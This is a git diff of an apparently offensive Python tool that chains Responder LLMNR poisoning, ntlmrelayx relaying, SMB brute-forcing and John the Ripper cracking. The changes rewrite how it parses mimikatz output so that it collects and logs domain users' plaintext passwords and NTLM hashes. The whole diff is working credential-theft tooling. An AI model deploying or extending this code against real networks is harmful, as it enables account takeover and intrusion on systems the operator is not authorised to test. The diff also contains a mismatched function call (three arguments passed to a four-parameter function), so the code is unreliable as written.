@@ -18,6 +18,8 @@ from libnmap.process import NmapProcess
 from subprocess import Popen, PIPE, check_output, CalledProcessError
 from asyncio.subprocess import PIPE, STDOUT
 from libnmap.parser import NmapParser, NmapParserException
+# Prevent JTR error in VMWare
+os.environ['CPUID_DISABLE'] = '1'
 
 # debug
 from IPython import embed
@@ -382,7 +384,7 @@ def smb_reverse_brute(loop, hosts, args):
 
 def log_pwds(users_pws):
     '''
-    Turns SMB password data {ip:[usr, usr2]} into a string
+    Turns SMB password data {ip:[usrr_pw, user2_pw]} into a string
     '''
     for k in users_pws:
         ip = k
@@ -567,17 +569,6 @@ def check_avx2_bug(cmd, run_already):
             print('[-] Error running JohnTheRipper: '+e)
             return
 
-def get_duplicate_hashes(prev_hashes, hashes):
-    '''
-    Update prev_hashes to prevent duplicate cracking
-    '''
-    for hash_type in hashes:
-        for h in hashes[hash_type]:
-            if h not in prev_hashes:
-                prev_hashes.append(h)
-
-    return prev_hashes
-
 def start_responder_llmnr():
     '''
     Start Responder alone for LLMNR attack
@@ -648,34 +639,56 @@ def get_ntlmrelay_hashes(line):
     else:
         return (version, ntlm_hash)
 
-def parse_mimikatz(mimi_user_pw, line):
+def format_mimi_data(dom, user, auth, hash_or_pw, prev_hashes, prev_pwds):
+    user_pw = user+':'+auth
+    print('[!] {} found! {}'.format(hash_or_pw, user_pw))
+    # log_pwds requires format {ip:[user_pw, user_pw2]}
+    log_pwds({dom:[user_pw]})
+    if hash_or_pw == 'Password':
+        prev_pwds.append(user_pw)
+    else:
+        prev_hashes.append(user_pw)
+
+    return prev_pwds, prev_hashes
+
+def parse_mimikatz(prev_pwds, prev_hashes, mimi_data, line):
     '''
     Parses mimikatz output for usernames and passwords
     '''
-    splitl = line.split()
+    splitl = line.split(':')
     user = None
     dom = None
     ntlm = None
 
     if "* Username" in line:
-        mimi_user_pw['user'] = splitl[-1]
-        mimi_user_pw['dom'] = None
-        mimi_user_pw['ntlm'] = None
-        mimi_user_pw['pw'] = None
-        print(line)
+        if mimi_data['user']:
+            user = mimi_data['user']
+            if user != '(null)' and mimi_data['dom']:
+                dom = mimi_data['dom']
+                # Prevent (null) and hex passwords from being stored
+                if mimi_data['pw']:
+                    prev_pwds, prev_hashes = format_mimi_data(dom, user, mimi_data['pw'], 'Password', prev_hashes, prev_pwds)
+                elif mimi_data['ntlm']:
+                    prev_pwds, prev_hashes = format_mimi_data(dom, user, mimi_data['ntlm'], 'Hash', prev_hashes, prev_pwds)
+
+        user = splitl[-1].strip()
+        if user != '(null)':
+            mimi_data['user'] = user
+        mimi_data['dom'] = None
+        mimi_data['ntlm'] = None
+        mimi_data['pw'] = None
     elif "* Domain" in line:
-        mimi_user_pw['dom'] = splitl[-1]
-        print(line)
+        mimi_data['dom'] = splitl[-1].strip()
     elif "* NTLM" in line:
-        mimi_user_pw['ntlm'] = splitl[-1]
-        print(line)
+        ntlm = splitl[-1].strip()
+        if ntlm != '(null)':
+            mimi_data['ntlm'] = splitl[-1].strip()
     elif "* Password" in line:
-        pw = splitl[-1]
-        mimi_user_pw['pw'] = splitl[-1]
-        print(line)
+        pw = splitl[-1].strip()
+        if pw != '(null)' and pw.count(' ') < 15:
+            mimi_data['pw'] = splitl[-1].strip()
 
-    return mimi_user_pw
-
+    return prev_pwds, prev_hashes, mimi_data
 
 def get_and_crack_resp_hashes(args, prev_hashes, prev_pwds, prev_lines):
     '''
@@ -710,6 +723,7 @@ def signal_handler(signal, frame):
 
     cleanup_resp()
     pn = Popen("ps aux | grep -i 'ntlmrelayx.py -' | grep -v grep | awk '{print $2}' | xargs kill".split(), stdout=PIPE, stderr=PIPE, shell=True)
+    print(pn.communicate())
 
     # Cleanup hash files
     ntlm_files = []
@@ -791,7 +805,7 @@ def main(report, args):
     # CTRL-C handler
     signal.signal(signal.SIGINT, signal_handler)
 
-    mimi_user_pw = {'dom':None, 'user':None, 'ntlm':None, 'pw':None}
+    mimi_data = {'dom':None, 'user':None, 'ntlm':None, 'pw':None}
     while 1:
         print('[*] ntlmrelayx.py output:')
         ntlmrelay_file = open('logs/ntlmrelayx.py.log', 'r')
@@ -799,7 +813,9 @@ def main(report, args):
         for line in file_lines:
 
             # check for errors
-            error = check_ntlmrelay_error(line, file_lines)
+            #error = check_ntlmrelay_error(line, file_lines)
+            if line.startswith('  ') or line.startswith('Traceback'):
+                print(line.strip())
 
             # ntlmrelayx output
             if re.search('\[.\]', line):
@@ -812,7 +828,7 @@ def main(report, args):
                 # PASS HASH INTO PREV_HASHES AND STUFF
 
             # Parse mimikatz
-            mimi_user_pw = parse_mimikatz(mimi_user_pw, line)
+            prev_pwds, prev_hashes, mimi_data = parse_mimikatz(prev_pwds, mimi_data, line)
 
 if __name__ == "__main__":
     args = parse_args()
